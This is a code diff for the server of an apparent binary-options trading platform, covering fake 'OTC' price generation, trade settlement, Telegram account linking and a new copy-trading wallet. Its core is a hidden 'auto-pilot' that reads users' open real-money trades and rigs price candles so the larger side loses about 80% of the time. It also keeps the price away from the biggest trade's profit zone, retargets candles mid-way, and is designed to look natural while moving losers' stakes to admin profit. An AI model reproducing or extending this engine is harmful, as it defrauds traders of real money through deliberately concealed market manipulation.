@@ -1,4 +1,4 @@
-// --- START: server.js (v30 - Perfect Candle Pattern Animation & Auto-Pilot) ---
+// --- START: main app server.js (v30 - Perfect Candle Animation, Auto-Pilot & Copy Engine) ---
 
 const express = require('express');
 const http = require('http');
@@ -36,7 +36,7 @@ const TIMEFRAME = 60000;
 const TICK_MS = 300;
 const MIN_PRICE = 0.00001;
 const HISTORY_SEED_COUNT = 100;
-const MAX_CANDLES = 5000; // Added to prevent undefined error in array shift
+const MAX_CANDLES = 5000;
 
 // 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
 const SMART_AUTO_PILOT = true; 
@@ -64,7 +64,6 @@ function updateGlobalPoolInDB(payoutChange, adminChange) {
     globalPayoutPool += payoutChange;
     globalAdminProfit += adminChange;
     
-    // Ensure pools don't drop below 0
     if (globalPayoutPool < 0) globalPayoutPool = 0;
     
     db.ref('admin/revenue_pool').update({
@@ -81,9 +80,7 @@ db.ref('admin/markets').on('value', (snapshot) => {
     const fbMarkets = snapshot.val() || {};
     Object.keys(fbMarkets).forEach(marketId => {
         const nodeData = fbMarkets[marketId] || {};
-        
         activeTradesDb[marketId] = nodeData.activeTrades || {};
-
         const type = nodeData.type;
         if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
             initializeNewMarket(marketId);
@@ -113,7 +110,7 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
     };
 }
 
-// 2. Exact Pattern Generator (FIXED WICK MATH)
+// 2. Exact Pattern Generator
 function generateDynamicCandle(timestamp, open, command) {
     let bodySize, upperWick, lowerWick, close, high, low;
     const volatility = open * (0.00008 + Math.random() * 0.0001);
@@ -194,14 +191,11 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     if (currentPeriod > lastCandle.timestamp) {
         let newCandle;
         
-        // Priority 1: Immediate Next Candle Command (from API)
         if (marketData.nextCandleCommand) {
             newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
-            console.log(`[ADMIN CMD] ${marketData.marketId} Set to: ${marketData.nextCandleCommand}`);
             marketData.nextCandleCommand = null;
         } 
         
-        // Priority 2: Smart Auto-Pilot (Hidden from Panel, operates in Backend)
         if (!newCandle && SMART_AUTO_PILOT) {
             const trades = activeTradesDb[marketData.marketId] || {};
             let immediateUpVol = 0, immediateDownVol = 0;
@@ -214,18 +208,15 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 const payoutRate = t.payoutRate || 1.85;
                 const expectedPayout = t.amount * payoutRate;
 
-                // Process Real Trades Only for Pool Calculation
                 if (!isDemo && !t.isProcessedForPool) {
                     const adminCut = t.amount * POOL_CONFIG.ADMIN_SHARE;
                     const userCut = t.amount * POOL_CONFIG.USER_SHARE;
                     updateGlobalPoolInDB(userCut, adminCut);
                     
-                    // Mark as processed so we don't calculate the same trade twice
                     t.isProcessedForPool = true;
                     db.ref(`admin/markets/${marketData.marketId}/activeTrades/${t.id}/isProcessedForPool`).set(true).catch(()=>{});
                 }
 
-                // Check if trade expires at the end of this upcoming candle (Immediate Threat)
                 if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000) {
                     if (t.direction === 'UP') {
                         immediateUpVol += t.amount;
@@ -236,36 +227,27 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                         if (!isDemo) immediateDownPayout += expectedPayout;
                     }
                 } else {
-                    // Trades expiring in the future (Drift / Safety Zone calculation)
                     if (t.direction === 'UP') futureUpVol += t.amount;
                     if (t.direction === 'DOWN') futureDownVol += t.amount;
                 }
             });
 
-            // Rule 1: Conflict Resolution - Real Payout Pool Check
+            // Rule 1: Conflict Resolution
             if (immediateUpVol > 0 || immediateDownVol > 0) {
                 let targetDirection = 'DOJI';
-
-                // Check if UP wins, can we pay?
                 const canAffordUp = immediateUpPayout <= globalPayoutPool;
-                // Check if DOWN wins, can we pay?
                 const canAffordDown = immediateDownPayout <= globalPayoutPool;
 
                 if (!canAffordUp && !canAffordDown) {
-                    // Disaster Scenario: Cannot afford either side (very rare). Force the lesser loss.
                     targetDirection = immediateUpPayout > immediateDownPayout ? 'RED' : 'GREEN';
                 } else if (!canAffordUp) {
-                    // Cannot afford UP win, MUST close DOWN
                     targetDirection = 'RED';
                 } else if (!canAffordDown) {
-                    // Cannot afford DOWN win, MUST close UP
                     targetDirection = 'GREEN';
                 } else {
-                    // Can afford both. Let's apply standard logic. Force larger volume to lose 80% of the time.
                     if (Math.random() < ADMIN_WIN_RATIO) {
                         targetDirection = immediateUpVol > immediateDownVol ? 'RED' : 'GREEN';
                     } else {
-                        // Let the users win naturally
                         targetDirection = immediateUpVol > immediateDownVol ? 'GREEN' : 'RED';
                     }
                 }
@@ -273,32 +255,25 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                 newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                 
-                // Deduct payout from pool for winners, and move loser's money to admin profit
                 let payoutChange = 0;
                 let adminProfitChange = 0;
 
                 if (targetDirection === 'GREEN') {
-                    // UP direction wins
-                    payoutChange = -immediateUpPayout; // Deduct from payout pool
-                    adminProfitChange = immediateDownVol; // Down direction's invested amount moves to admin profit
+                    payoutChange = -immediateUpPayout;
+                    adminProfitChange = immediateDownVol;
                 } else if (targetDirection === 'RED') {
-                    // DOWN direction wins
-                    payoutChange = -immediateDownPayout; // Deduct from payout pool
-                    adminProfitChange = immediateUpVol; // Up direction's invested amount moves to admin profit
+                    payoutChange = -immediateDownPayout;
+                    adminProfitChange = immediateUpVol;
                 } else {
-                    // In case of a DOJI or unexpected state, consider it a loss for both (safest for admin)
                     adminProfitChange = immediateUpVol + immediateDownVol;
                 }
 
                 if (payoutChange !== 0 || adminProfitChange !== 0) {
                     updateGlobalPoolInDB(payoutChange, adminProfitChange);
                 }
-
-                console.log(`[AUTO-PILOT IMMEDIATE] Pool: $${globalPayoutPool.toFixed(2)}. U-Pay: $${immediateUpPayout} D-Pay: $${immediateDownPayout}. Forcing ${targetDirection}`);
             } 
-            // Rule 2: Smart Price Anchoring - Safely guide future trades without suspicious spikes
+            // Rule 2: Smart Price Anchoring
             else if (futureUpVol > 0 || futureDownVol > 0) {
-                // Find the biggest future threat to anchor the price
                 let biggestFutureTrade = null;
                 Object.values(trades).forEach(t => {
                     if (t.expiryTimestamp > nextPeriod + 2000 && !t.isDemo) {
@@ -313,28 +288,22 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 if (biggestFutureTrade) {
                     const tradeOpenPrice = biggestFutureTrade.openPrice;
                     const currentPrice = lastCandle.close;
-                    
-                    // Check if price is in "Danger Zone" (User is winning or too close to entry)
-                    // Adding a 0.00002 buffer so it reacts before the user actually crosses into profit
                     const isDangerUP = biggestFutureTrade.direction === 'UP' && currentPrice >= (tradeOpenPrice - 0.00002);
                     const isDangerDOWN = biggestFutureTrade.direction === 'DOWN' && currentPrice <= (tradeOpenPrice + 0.00002);
 
                     const rand = Math.random();
 
                     if (isDangerUP) {
-                        // User took UP and is winning, pull it DOWN naturally
                         if (rand < 0.60) driftCommand = 'RED'; 
                         else if (rand < 0.85) driftCommand = 'RED_SHOOTING_STAR';
                         else driftCommand = 'DOJI';
                     } 
                     else if (isDangerDOWN) {
-                        // User took DOWN and is winning, pull it UP naturally
                         if (rand < 0.60) driftCommand = 'GREEN'; 
                         else if (rand < 0.85) driftCommand = 'GREEN_HAMMER';
                         else driftCommand = 'DOJI';
                     } 
                     else {
-                        // Safe Zone: User is currently losing. Hold the price here smoothly (Anchoring)
                         if (rand < 0.40) driftCommand = 'GREEN'; 
                         else if (rand < 0.80) driftCommand = 'RED'; 
                         else driftCommand = 'SPINNING_TOP';
@@ -344,13 +313,10 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 }
 
                 newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, driftCommand);
-                // Keep volatility smooth so the anchoring looks completely natural
                 newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00004);
-                console.log(`[AUTO-PILOT ANCHOR] Anchoring against biggest future trade. Using ${driftCommand}`);
             }
         }
         
-        // Priority 3: Fallback to Natural Market
         if (!newCandle) {
             newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close, true);
         }
@@ -370,13 +336,57 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     const timeElapsed = Math.max(0, now - currentPeriod);
     const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
 
+    // --- 🔥 MID-CANDLE SMART MANIPULATION (Smoothly adjusts at 30s mark) 🔥 ---
+    if (timeElapsed >= 30000 && !candle.isMidEvaluated && SMART_AUTO_PILOT) {
+        candle.isMidEvaluated = true;
+        
+        const trades = activeTradesDb[marketData.marketId] || {};
+        let upVol = 0, downVol = 0;
+        let upPayout = 0, downPayout = 0;
+        
+        Object.values(trades).forEach(t => {
+            if (!t.isDemo && !t.isTournament && t.expiryTimestamp && t.expiryTimestamp <= currentPeriod + TIMEFRAME + 2000) {
+                const payout = t.amount * (t.payoutRate || 1.85);
+                if (t.direction === 'UP') { upVol += t.amount; upPayout += payout; }
+                if (t.direction === 'DOWN') { downVol += t.amount; downPayout += payout; }
+            }
+        });
+
+        if (upVol > 0 || downVol > 0) {
+            const canAffordUp = upPayout <= globalPayoutPool;
+            const canAffordDown = downPayout <= globalPayoutPool;
+            let newTarget = null;
+            const volatility = candle.open * 0.0001;
+
+            if (!canAffordUp && !canAffordDown) {
+                newTarget = upPayout > downPayout ? 'RED' : 'GREEN';
+            } else if (!canAffordUp) {
+                newTarget = 'RED';
+            } else if (!canAffordDown) {
+                newTarget = 'GREEN';
+            } else {
+                if (Math.random() < ADMIN_WIN_RATIO) {
+                    newTarget = upVol > downVol ? 'RED' : 'GREEN';
+                }
+            }
+
+            if (newTarget) {
+                if (newTarget === 'RED' && candle.targetClose >= candle.open) {
+                    candle.targetClose = candle.open - volatility - (Math.random() * volatility);
+                    candle.targetLow = Math.min(candle.targetLow, candle.targetClose - volatility);
+                } else if (newTarget === 'GREEN' && candle.targetClose <= candle.open) {
+                    candle.targetClose = candle.open + volatility + (Math.random() * volatility);
+                    candle.targetHigh = Math.max(candle.targetHigh, candle.targetClose + volatility);
+                }
+            }
+        }
+    }
+    // -----------------------------------------------------------------------
+
     let idealPrice = candle.open;
     const pattern = candle.pattern || 'NORMAL';
 
-    // To draw proper wicks, the live price MUST visit the targetHigh and targetLow 
-    // before settling at the targetClose. This logic forces it.
     if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
-        // Drop deep down first, then recover
         if (progress < 0.6) {
             idealPrice = candle.open - (candle.open - candle.targetLow) * (progress / 0.6);
         } else {
@@ -384,7 +394,6 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
         }
     } 
     else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
-        // Pump high up first, then crash down
         if (progress < 0.6) {
             idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.6);
         } else {
@@ -392,29 +401,23 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
         }
     }
     else if (pattern.includes('DOJI') || pattern.includes('SPINNING_TOP')) {
-        // Go up, go down, settle in middle
         if (progress < 0.3) idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.3);
         else if (progress < 0.7) idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetLow) * ((progress - 0.3) / 0.4);
         else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.7) / 0.3);
     }
     else {
-        // Normal, Marubozu, Pump, Dump (Smooth transition)
         const easeProgress = 1 - Math.pow(1 - progress, 3);
         idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
     }
 
-    // Add Diminishing Noise
     const noiseFactor = 1 - Math.pow(progress, 2); 
     const volatility = candle.open * 0.00005;
     const noise = (Math.random() - 0.5) * volatility * noiseFactor;
 
     marketData.currentPrice = idealPrice + noise;
-
-    // Strict Boundaries
     marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
     marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);
 
-    // Final Lock
     if (timeElapsed >= TIMEFRAME - 1500) {
         marketData.currentPrice = candle.targetClose;
     }
@@ -456,7 +459,6 @@ app.get('/api/history/:marketId', (req, res) => {
     }
 });
 
-// --- REST API ENDPOINT ---
 app.post('/api/admin/command', (req, res) => {
     const { marketId, command } = req.body;
     if (!marketId || !command) {
@@ -486,7 +488,6 @@ setInterval(() => {
         broadcastCandle(marketId, candle);
     }
 
-    // Sync Live Price to Firebase every 1.5 seconds for Admin Panel
     if (now - lastSyncTime > 1500) {
         lastSyncTime = now;
         const batchUpdates = {};
@@ -524,10 +525,6 @@ function sendTelegramMessage(chatId, text) {
     req.end();
 }
 
-// NOTE: OTP Sending is now handled directly by the Frontend (index.html) to ensure instant delivery.
-// We only keep the Polling logic below to link new accounts.
-
-// 2. Poll Telegram for Account Linking (No npm install required)
 function pollTelegramUpdates() {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
     https.get(url, (res) => {
@@ -543,7 +540,6 @@ function pollTelegramUpdates() {
                             const text = update.message.text.trim();
                             const chatId = update.message.chat.id;
                             
-                            // Check if text contains the LINK- code
                             if (text.includes('LINK-')) {
                                 const codeMatch = text.match(/LINK-[A-Z0-9]{6}/);
                                 if (codeMatch) {
@@ -551,12 +547,10 @@ function pollTelegramUpdates() {
                                     const linkSnap = await db.ref(`telegram_links/${linkCode}`).once('value');
                                     if (linkSnap.exists()) {
                                         const uid = linkSnap.val().uid;
-                                        // Link the account
                                         await db.ref(`users/${uid}`).update({
                                             telegramChatId: chatId,
                                             twoFactorEnabled: true
                                         });
-                                        // Delete the code so it can't be used again
                                         await linkSnap.ref.remove();
                                         
                                         sendTelegramMessage(chatId, `✅ *Account Linked Successfully!*\n\nYour Telegram is now connected to your ICTEX Trade account for 2FA security.`);
@@ -569,19 +563,17 @@ function pollTelegramUpdates() {
                     }
                 }
             } catch(e) { console.error("Polling parse error:", e); }
-            setTimeout(pollTelegramUpdates, 1000); // Poll again
+            setTimeout(pollTelegramUpdates, 1000); 
         });
     }).on('error', (e) => {
         console.error("Polling connection error:", e);
         setTimeout(pollTelegramUpdates, 3000);
     });
 }
-// Start Polling
 pollTelegramUpdates();
 
-
 // ==========================================
-// 🔥 ULTIMATE ARBITER: Trade Resolution Engine (FIXED) 🔥
+// 🔥 ULTIMATE ARBITER: Trade Resolution Engine 🔥
 // ==========================================
 setInterval(async () => {
     const now = Date.now();
@@ -594,13 +586,10 @@ setInterval(async () => {
         for (const tradeId in trades) {
             const trade = trades[tradeId];
 
-            // Increased tolerance to 60 seconds to ensure no trade is missed
             if (trade.expiryTimestamp && now >= trade.expiryTimestamp && now < trade.expiryTimestamp + 60000) {
                 
-                // If trade is already being resolved elsewhere, skip it
                 const historyCheckSnap = await db.ref(`users/${trade.uid}/tradeHistory/${trade.id}`).once('value');
                 if (historyCheckSnap.exists()) {
-                    // Cleanup stuck trade from activeTrades
                     if (!allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`]) allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
                     if (!allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`]) allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;
                     continue;
@@ -609,19 +598,14 @@ setInterval(async () => {
                 let closingPrice = null;
                 const relevantTimeframe = TIMEFRAME;
                 
-                // FIXED CANDLE FINDING LOGIC
-                // Look for the candle that exactly matches the expiry timeframe
                 let closingCandle = marketData.history.find(c => {
                     const candleEnd = c.timestamp + relevantTimeframe;
-                    // Add a small buffer to catch milliseconds offset
                     return trade.expiryTimestamp > c.timestamp && trade.expiryTimestamp <= (candleEnd + 2000);
                 });
 
                 if (closingCandle) {
-                    // For all trades, the close of the matching candle is the true exact result
                     closingPrice = closingCandle.close; 
                 } else {
-                    // Critical Safeguard: If no exact candle is found but time is up, use the live price
                     closingPrice = marketData.currentPrice;
                 }
 
@@ -649,25 +633,42 @@ setInterval(async () => {
                     profitChange = -betAmount;
                 }
                 
-                // Prepare Firebase Updates
                 const historyEntry = { ...trade, closePrice: closingPrice, result, payout };
                 
-                // Add to history
-                allMarketUpdates[`users/${trade.uid}/tradeHistory/${trade.id}`] = historyEntry;
-
-                // Send result notification to client
+                if (trade.isCopied) {
+                    allMarketUpdates[`users/${trade.uid}/copyHistory/${trade.id}`] = historyEntry;
+                } else {
+                    allMarketUpdates[`users/${trade.uid}/tradeHistory/${trade.id}`] = historyEntry;
+                }
                 allMarketUpdates[`tradeResults/${trade.uid}/${trade.id}`] = { result, pnl: profitChange, amount: betAmount, market: trade.market };
 
                 // Update balances for non-demo trades
                 if (!trade.isDemo && !trade.isTournament) {
-                    if (result === 'win') {
-                        allMarketUpdates[`users/${trade.uid}/realBalance`] = admin.database.ServerValue.increment(payout);
-                    } else if (result === 'push') {
-                        allMarketUpdates[`users/${trade.uid}/realBalance`] = admin.database.ServerValue.increment(trade.realAmount);
-                        allMarketUpdates[`users/${trade.uid}/bonusBalance`] = admin.database.ServerValue.increment(trade.bonusAmount);
+                    if (trade.isCopied) {
+                        // ✅ Copy Trading uses Copy Wallet
+                        if (result === 'win') {
+                            allMarketUpdates[`users/${trade.uid}/copyBalance`] = admin.database.ServerValue.increment(payout);
+                            if (trade.masterId) {
+                                allMarketUpdates[`users/${trade.uid}/activeCopies/${trade.masterId}/currentProfit`] = admin.database.ServerValue.increment(profitChange);
+                            }
+                        } else if (result === 'push') {
+                            allMarketUpdates[`users/${trade.uid}/copyBalance`] = admin.database.ServerValue.increment(trade.amount);
+                        } else if (result === 'loss') {
+                            if (trade.masterId) {
+                                allMarketUpdates[`users/${trade.uid}/activeCopies/${trade.masterId}/currentLoss`] = admin.database.ServerValue.increment(betAmount);
+                            }
+                        }
+                    } else {
+                        // ✅ Normal Trading uses Real/Bonus Wallet
+                        if (result === 'win') {
+                            allMarketUpdates[`users/${trade.uid}/realBalance`] = admin.database.ServerValue.increment(payout);
+                        } else if (result === 'push') {
+                            allMarketUpdates[`users/${trade.uid}/realBalance`] = admin.database.ServerValue.increment(trade.realAmount);
+                            allMarketUpdates[`users/${trade.uid}/bonusBalance`] = admin.database.ServerValue.increment(trade.bonusAmount);
+                        }
+                        allMarketUpdates[`users/${trade.uid}/totalProfitLoss`] = admin.database.ServerValue.increment(profitChange);
+                        allMarketUpdates[`users/${trade.uid}/dailyProfit`] = admin.database.ServerValue.increment(profitChange);
                     }
-                    allMarketUpdates[`users/${trade.uid}/totalProfitLoss`] = admin.database.ServerValue.increment(profitChange);
-                    allMarketUpdates[`users/${trade.uid}/dailyProfit`] = admin.database.ServerValue.increment(profitChange);
                 }
 
                 // Cleanup active trades
@@ -682,4 +683,51 @@ setInterval(async () => {
     if (Object.keys(allMarketUpdates).length > 0) {
         db.ref().update(allMarketUpdates).catch(e => console.error("Arbiter update failed:", e));
     }
-}, 2000); // Check every 2 seconds
+}, 2000);
+
+// ==========================================
+// 🔥 COPY TRADING SL/TP AUTO DISCONNECT ENGINE 🔥
+// ==========================================
+setInterval(async () => {
+    try {
+        const usersSnap = await db.ref('users').once('value');
+        if (!usersSnap.exists()) return;
+
+        const updates = {};
+        
+        usersSnap.forEach(child => {
+            const uid = child.key;
+            const userData = child.val();
+
+            if (userData.activeCopies) {
+                Object.entries(userData.activeCopies).forEach(([mId, sub]) => {
+                    if (sub.status === 'active') {
+                        const currentL = parseFloat(sub.currentLoss) || 0;
+                        const currentP = parseFloat(sub.currentProfit) || 0;
+                        const sl = parseFloat(sub.stopLoss) || 0;
+                        const tp = parseFloat(sub.takeProfit) || 0;
+                        
+                        let shouldDisconnect = false;
+                        
+                        if (sl > 0 && currentL >= sl) {
+                            shouldDisconnect = true;
+                        } else if (tp > 0 && currentP >= tp) {
+                            shouldDisconnect = true;
+                        }
+                        
+                        if (shouldDisconnect) {
+                            updates[`users/${uid}/activeCopies/${mId}`] = null;
+                            console.log(`[COPY ENGINE] Auto-disconnected User ${uid} from Master ${mId} (SL/TP Reached).`);
+                        }
+                    }
+                });
+            }
+        });
+
+        if (Object.keys(updates).length > 0) {
+            await db.ref().update(updates);
+        }
+    } catch (error) {
+        console.error("[COPY ENGINE SL/TP] Error:", error);
+    }
+}, 10000);
